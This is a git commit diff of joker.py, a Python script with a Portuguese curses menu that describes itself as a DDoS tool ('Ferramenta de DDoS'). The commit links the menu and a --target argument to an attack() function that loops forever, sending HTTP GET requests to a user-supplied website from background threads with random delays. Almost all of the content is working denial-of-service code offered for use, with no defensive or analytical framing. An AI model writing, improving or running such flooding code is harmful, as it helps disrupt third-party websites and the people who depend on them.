43e0224c919230b42e4b7f25fc27dabc9939cad1
Nox <157261017+Soulsfuck@users.noreply.github.com>
2024-05-15 23:22:40 -0300

    Update joker.py

--- joker.py
+++ joker.py
@@ -1,5 +1,4 @@
-#!usr/bin/python3
-
+#!/usr/bin/python3
 import requests
 import threading
 import argparse
@@ -10,26 +9,23 @@ import random
 import time
 
 TARGET = ""
-
 LOGO = """
-
- ######   ####    ######   #### 
-     ##  #    #       ##  #    #
-     ##  #    #       ##  #    #
- #   ##  #    #  #    ##  #    #   
-  ####    ####    #####    ####  
-
+#### ######
+***  #    #       ***  #    #
+***  #    #       ***  #    #
+*** # # # *** #
+#### #####
 """
 
-def attack(target, message):
+def attack():
+    global TARGET
     while True:
         try:
-            response = requests.get(target)
-            print("Request sent to:", target)
+            response = requests.get(TARGET)
+            print("Requisição enviada para: ", TARGET)
         except Exception as e:
-            print("Failed to send request:", e)
+            print("Falha ao enviar requisição: ", e)
         time.sleep(random.uniform(0.5, 2.0))
-
 
 def clone_repository(stdscr):
     stdscr.clear()
@@ -41,10 +37,11 @@ def clone_repository(stdscr):
     stdscr.getch()
 
 def main(stdscr):
+    global TARGET
     stdscr.clear()
     height, width = stdscr.getmaxyx()
-    stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO) 
-    stdscr.addstr(height - 3, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")  
+    stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO)
+    stdscr.addstr(height - 3, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")
     stdscr.refresh()
 
     options = [
@@ -53,27 +50,47 @@ def main(stdscr):
         ("Instalar Dependências", "i"),
         ("Sair", "q")
     ]
-
     current_option = 0
 
     while True:
-        key = stdscr.getch()  
+        stdscr.clear()
+        stdscr.addstr(0, (width // 2) - len(LOGO.split("\n")[0]) // 2, LOGO)
+        for idx, option in enumerate(options):
+            x = width // 2 - len(option[0]) // 2
+            y = height // 2 - len(options) // 2 + idx
+            if idx == current_option:
+                stdscr.attron(curses.A_REVERSE)
+                stdscr.addstr(y, x, option[0])
+                stdscr.attroff(curses.A_REVERSE)
+            else:
+                stdscr.addstr(y, x, option[0])
+        stdscr.refresh()
 
+        key = stdscr.getch()
         if key == curses.KEY_UP and current_option > 0:
             current_option -= 1
         elif key == curses.KEY_DOWN and current_option < len(options) - 1:
             current_option += 1
-        elif key == curses.KEY_ENTER or key in [10, 13]:  
+        elif key == curses.KEY_ENTER or key in [10, 13]:
             if options[current_option][1] == "a":
-                pass  
+                TARGET = input("Coloque o site: ")
+                thread = threading.Thread(target=attack)
+                thread.start()
             elif options[current_option][1] == "c":
                 clone_repository(stdscr)
             elif options[current_option][1] == "i":
-                pass  
+                pass
             elif options[current_option][1] == "q":
                 break
 
-        stdscr.addstr(height // 2, (width // 2) - len(options[current_option][0]) // 2, options[current_option][0])
-        stdscr.refresh()
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Ferramenta de DDoS")
+    parser.add_argument("--target", type=str, help="URL do alvo")
+    args = parser.parse_args()
 
-curses.wrapper(main)
+    if args.target:
+        TARGET = args.target
+        attack_thread = threading.Thread(target=attack)
+        attack_thread.start()
+    else:
+        curses.wrapper(main)
